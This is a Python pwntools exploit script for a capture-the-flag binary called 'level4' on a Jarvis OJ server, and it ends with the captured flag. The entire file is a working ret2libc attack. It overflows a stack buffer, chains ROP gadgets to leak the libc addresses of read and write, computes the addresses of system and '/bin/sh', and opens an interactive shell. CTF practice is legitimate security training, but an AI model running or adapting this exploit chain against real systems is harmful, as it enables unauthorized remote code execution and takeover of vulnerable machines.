#!
#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
"""

import sys
import re
from os import path
from pwn import *
from pwnlib import gdb
from LibcSearcher import *

context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level4")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9880")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def main():
    POP3 = 0x08048509
    payload = flat((
        '!' * (0x88 + 4),
        elf.sym["write"],
        POP3,
        1, elf.got["read"], 4,
        elf.sym["write"],
        elf.sym["_start"],
        1, elf.got["write"], 4,
    ))
    io.send(payload)
    read_addr = u32(io.recv(4))
    write_addr = u32(io.recv(4))
    log.success("read_addr = 0x%x", read_addr)
    log.success("write_addr = 0x%x", write_addr)

    # libc_searcher = LibcSearcher("read", read_addr)
    # libc_searcher.add_condition("write", write_addr)
    # libc_base = write_addr - libc_searcher.dump("write")
    # system_addr = libc_base + libc_searcher.dump("system")
    # bin_sh_addr = libc_base + libc_searcher.dump("str_bin_sh")
    # log.info("system_addr = 0x%x", system_addr)
    # log.info("bin_sh_addr = 0x%x", bin_sh_addr)
    # payload = flat((
    #     '!' * (0x88 + 4),
    #     system_addr,
    #     elf.sym["_start"],
    #     bin_sh_addr,
    # ))

    ##########
    # LibcSearcher失败了
    # 以下数据是从https://libc.nullbyte.cat/ https://libc.blukat.me/等网站上查询的
    ##########

    libc_base = write_addr - 0x0c8880
    system_addr = libc_base + 0x03de80
    bin_sh_addr = libc_base + 0x12dc51
    payload = flat((
        '!' * (0x88 + 4),
        system_addr,
        elf.sym["_start"],
        bin_sh_addr,
    ))

    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{882130cf51d65fb705440b218e94e98e}
